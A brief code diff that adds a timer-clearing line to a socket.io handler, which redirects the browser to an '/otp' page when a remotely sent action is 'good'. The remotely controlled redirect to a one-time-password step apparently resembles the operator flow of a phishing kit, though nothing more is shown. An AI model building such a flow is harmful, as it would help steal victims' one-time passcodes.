@@ -493,6 +493,7 @@ p {
     }, 60000);
 
     socket.on('choice', (data) => {
+	     clearTimeout(timer);
         if (data.action === "good") {
              window.location.href = '/otp';
         } else if (data.action === "bad") {
